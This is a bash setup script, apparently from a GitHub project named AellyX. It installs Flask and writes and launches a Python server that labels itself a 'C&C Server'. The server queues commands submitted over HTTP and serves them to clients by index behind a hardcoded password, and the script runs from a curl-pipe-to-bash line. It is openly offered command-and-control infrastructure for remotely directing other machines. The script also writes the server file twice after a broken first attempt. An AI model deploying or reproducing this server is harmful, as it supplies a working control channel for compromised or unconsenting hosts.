#!/bin/bash
# AellyX C&C Server Setup for Ubuntu/Linux
# Usage: curl -sL https://raw.githubusercontent.com/k4ran909/AellyX/main/setup_server.sh | bash

PORT=5261
PASS="#technoz833#"

echo "========================================"
echo "   AellyX C&C Server Setup"
echo "========================================"

# Install dependencies
echo "[1/3] Installing dependencies..."
sudo apt update -qq
sudo apt install python3-pip -y -qq
pip3 install flask requests --break-system-packages -q 2>/dev/null || pip3 install flask requests -q

# Create server script
echo "[2/3] Creating server..."
mkdir -p ~/aellyx-server
cat > ~/aellyx-server/server.py << 'SERVERCODE'
import flask
from flask import request

app = flask.Flask('AellyX-Server')
data = {'agreed': False, 'commands': ['']}

@app.route('/get/com<pos>', methods=['GET', 'POST'])
def command_get(pos=0):
    if request.form.get('password') == PASSWORD:
        try:
            return str(data['commands'][int(pos)])
        except:
            return '500'
    return 'Invalid Password'

@app.route('/get/agreed', methods=['GET', 'POST'])
def agreed_get():
    if request.form.get('password') == PASSWORD:
        return str(data['agreed'])
    return 'Invalid Password'

@app.route('/set/com', methods=['GET', 'POST'])
def command_set():
    if request.form.get('password') == PASSWORD:
        cmd = request.form.get('data', '')
        data['commands'].append(cmd)
        print(f'[CMD] Received: {cmd}')
        return '200'
    return 'Invalid Password'

@app.route('/set/agreed', methods=['GET', 'POST'])
def agreed_set():
    if request.form.get('password') == PASSWORD:
        data['agreed'] = request.form.get('data')
        print(f'[AGREED] Set to: {data["agreed"]}')
        return '200'
    return 'Invalid Password'

@app.route('/reset', methods=['GET', 'POST'])
def reset_data():
    global data
    if request.form.get('password') == PASSWORD:
        data = {'agreed': False, 'commands': ['']}
        print('[RESET] Data cleared')
        return '200'
    return 'Invalid Password'

@app.route('/status', methods=['GET'])
def status():
    return f'AellyX Server | Commands: {len(data["commands"])} | Agreed: {data["agreed"]}'

if __name__ == '__main__':
    print('=' * 50)
    print('AellyX C&C Server')
    print(f'Port: {PORT}')
    print(f'Password: {PASSWORD}')
    print('=' * 50)
    app.run(host='0.0.0.0', port=PORT)
SERVERCODE

# Replace placeholders
sed -i "s/PASSWORD = PASSWORD/PASSWORD = '$PASS'/" ~/aellyx-server/server.py
sed -i "s/PORT}/$PORT/" ~/aellyx-server/server.py

# Fix the server.py properly
cat > ~/aellyx-server/server.py << EOF
import flask
from flask import request

app = flask.Flask('AellyX-Server')
data = {'agreed': False, 'commands': ['']}
PASSWORD = '$PASS'
PORT = $PORT

@app.route('/get/com<pos>', methods=['GET', 'POST'])
def command_get(pos=0):
    if request.form.get('password') == PASSWORD:
        try:
            return str(data['commands'][int(pos)])
        except:
            return '500'
    return 'Invalid Password'

@app.route('/get/agreed', methods=['GET', 'POST'])
def agreed_get():
    if request.form.get('password') == PASSWORD:
        return str(data['agreed'])
    return 'Invalid Password'

@app.route('/set/com', methods=['GET', 'POST'])
def command_set():
    if request.form.get('password') == PASSWORD:
        cmd = request.form.get('data', '')
        data['commands'].append(cmd)
        print(f'[CMD] Received: {cmd}')
        return '200'
    return 'Invalid Password'

@app.route('/set/agreed', methods=['GET', 'POST'])
def agreed_set():
    if request.form.get('password') == PASSWORD:
        data['agreed'] = request.form.get('data')
        print(f'[AGREED] Set to: {data["agreed"]}')
        return '200'
    return 'Invalid Password'

@app.route('/reset', methods=['GET', 'POST'])
def reset_data():
    global data
    if request.form.get('password') == PASSWORD:
        data = {'agreed': False, 'commands': ['']}
        print('[RESET] Data cleared')
        return '200'
    return 'Invalid Password'

@app.route('/status', methods=['GET'])
def status():
    return f'AellyX Server | Commands: {len(data["commands"])} | Agreed: {data["agreed"]}'

if __name__ == '__main__':
    print('=' * 50)
    print('AellyX C&C Server')
    print(f'Port: {PORT}')
    print(f'Password: {PASSWORD}')
    print('=' * 50)
    app.run(host='0.0.0.0', port=PORT)
EOF

echo "[3/3] Starting server..."
echo ""
echo "========================================"
echo "   Server Ready!"
echo "========================================"
echo ""
echo "Your VPS IP: $(curl -s ifconfig.me)"
echo "Port: $PORT"
echo "Password: $PASS"
echo ""
echo "Open firewall: sudo ufw allow $PORT"
echo ""

cd ~/aellyx-server
python3 server.py
